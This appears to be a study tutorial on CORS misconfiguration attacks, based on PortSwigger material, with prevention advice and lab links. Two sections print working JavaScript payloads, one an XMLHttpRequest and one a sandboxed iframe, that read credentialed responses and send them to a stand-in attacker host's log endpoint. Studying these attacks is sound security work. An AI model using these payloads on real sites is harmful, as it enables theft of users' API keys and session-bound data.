# Cross-Origin Resource Sharing (CORS)
## Vulnerabilities Arising from CORS configuration issues
- Many modern websites use CORS to allow access from subdomains and trusted third parties.
- The implementation of CORS may contain mistakes or be overly lenient to ensure that everything works, resulting in exploitable vulnerabilities.

### Server-generated ACAO header from client-specified Origin header.
- Maintaining a list of allowed domains requires ongoing effort, and any mistakes risk bearing functionality.
- One way to effectively allow access is by reading the Origin header from requests and including a response header stating that the requesting origin is allowed.
- Consider an application that receives the following request:
```
GET /sensitiveVictimData HTTP/1.1
Host: vulnerableWebsite.com
Origin: https://maliciousWebsite.com
Cookie: sessionId=...
```
It then responds with:
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://maliciousWebsite.com
Access-Control-Allow-Credentials: true
...
```
- These headers state that access is allowed from the requesting domain (`maliciousWebsite.com`) and that the cross-domain requests can include cookies (`Access-Control-Allow-Credentials: true`) and so will be processed in-session.
- If the response contains any sensitive information such as an `API key` or `CSRF token`, one can retrieve this by placing the following script on the website:
```
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get', 'https://vulnerableWebsite.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener(){
location='//maliciousWebsite.com/log?key='+this.responseText;
};
```
### Error parsing Origin headers
- Some applications that support access from multiple origins do so by using whitelist of allowed origins.
- When CORS request is received, the supplied origin is compared to the whitelist and is reflected in the `Access-Control-Allow-Origin` header so that access is granted.
- Some applications allow access from various other organizations' domains including their subdomains. These rules are often implemented by matching URL prefixes or suffixes or using regular expressions.
- Any mistakes in the implementation can lead to access being granted to unintended external domains.
- Supposing an application grants access to all domains ending in:
```
normalWebsite.com
```
- An attacker might be able to gain access by registering the domain:
```
hackersnormalWebsite.com
```
- Alternatively, suppose an application grants access to all domains beginning with:
```
normalWebsite.com
```
- An attacker might be able to gain access using the domain:
```
normalWebsite.com.evilUser.net
```
### Whitelisted null origin value
- The specification for the Origin header supports the value `null`. Browsers might send the value `null` in the Origin header in various unusual situations:
  1. Cross-site redirects.
  2. Requests from serialized data.
  3. Request from the `file:` protocol.
  4. Sandboxed cross-origin requests.
- Some applications might whitelist the `null` origin to support local development of the application.
- Suppose an application receives the following cross-domain request:
```
GET /sensitive-victim-data
Host: vulnerableWebsite.com
Origin: null
```
The server responds with:
```
HTTP/1.1 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```
- An attacker can use can use various tricks to generate a cross-domain request containing the value `null` in the Origin header satisfying the whitelist and leading to cross-domain access.
- This can be done using a sandboxed `iframe` cross-origin request of the form:
```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='malicious-website.com/log?key='+this.responseText;
};
</script>"></iframe>
```
### Exploiting XSS via CORS trust relationship
- Even `correctly` configured CORS establishes a trust relationship between two origins.
- If a website trusts an origin that is vulnerable to XSS, thenan attacker could exploit the XSS to inject some JavaScript that uses CORS to retrieve sensitive information from the site that trusts the vulnerable application.
- Given the following request:
```
GET /api/requestApiKey HTTP/1.1
Host: vulnerableWebsite.com
Origin: https://subdomain.vulnerableWebsite.com
Cookie: sessionid=...
```
- If the server responds with the following, then an attacker who finds an XSS vulnerability on `subdomain.vulnerableWebsite.com` could use that to retrieve the API key.
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://subdomain.vulnerableWebsite.com
Access-Control-Allow-Credentials: true
```
- The API key can be retrieved using the following URL:
```
https://subdomain.vulnerableWebsite.com/?xss=cors-stuff-here</script>
```
### Breaking TLS with poorly configured CORS
- In this situation, an attacker who is in a position to intercept a victim user's traffic can exploit the CORS configuration to compromise the victim's interaction with the application.
- This attack involves the following steps:
  1. The victim user makes any plain HTTP request.
  2. The attacker injects a redirection to `http://trusted-subdomain.vulnerable-website.com`
  3. The victim's browser follows the redirect.
  4. The attacker intercepts the plain HTTP request, and returns a spoofed response containing a CORS request to `https://vulnerable-website.com`
  5. The victim's browser makes the CORS request, including the origin `http://trusted-subdomain.vulnerable-website.com`
  6. The application allows the request because this is a whitelisted origin. The requested sensitive data is returned in the response.
  7. The attacker's spoofed page can read the sensitive data and transmit it to any domain under the attacker's control.
- This attack is effective even if the vulnerable website is otherwise robust in its usage of HTTPS, with no HTTP endpoint and all cookies flagged as secure.

### Intranets and CORS without credentials
- Most CORS attacks rely on the presence of the response header:
```
Access-Control-Allow-Credentials: true
```
- Without that header, the victim user's browser will refuse to send their cookies, meaning the attacker will only gain access to unauthenticated content, which they could easily access by browsing directly to the target website.
- Internal websites are often held to a lower security standard than external sites, enabling attackers to find vulnerabilities and gain further access.
- A cross-domain request within a private network may be as follows:
```
GET /reader?url=doc1.pdf
Host: intranet.website.com
Origin: https://website.com
```
The server responds with:
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
```
- The application server is trusting resource requests from any origin without credentials. 
- If users within the private IP address space access the public internet then a CORS-based attack can be performed from the external site that uses the victim's browser as a proxy for accessing intranet resources.

# How to prevent CORS-based attacks.
- CORS vulnerabilities arise due to mainly misconfigurations.
- The following sections describe some effective defenses against CORS attacks.
1. `Proper configuration of cross-domain requests.`
- If a web resource contains sensitive information, the origin should be properly specified in the `Access-Control-Allow-Origin` header.
2. `Only allow trusted sites`
- Dynamically reflecting origins from cross-domain requests without validationis readily exploitable and should be avoided.
3. `Avoid whitelisting null`
- Cross-domain resource calls from internal documents and sandboxed requests can specify the `null` origin.
- CORS headers should be properly defined in respect of trusted origins for private and public servers.
4. `Avoid wildcards in internal networks`
- Trusting network configuration alone to protect internal resources is not sufficient when internal browsers can access untrusted external domains.
5. `CORS is not a substitue for server-side security policies`
- CORS defines browser behavious and is never a replacement for server-side protection of sensitive data- an attacker can therefore directly forge a request from any trusted origin.
- Web servers should continue to apply protections over sensitive data, such as authentication and session management, in addition to properly configured CORS. 

--------------------------------------------------------------------------------
# MATERIALS
### Reference
- [PortSwigger - CORS](https://portswigger.net/web-security/cors)

### Labs
- [CORS vulnerability with basic origin reflection](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)
- [CORS vulnerability with trusted null origin](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack)
- [CORS vulnerability with trusted insecure protocols](https://portswigger.net/web-security/cors/lab-breaking-https-attack)
- [CORS vulnerability with internal network pivot attack](https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack)
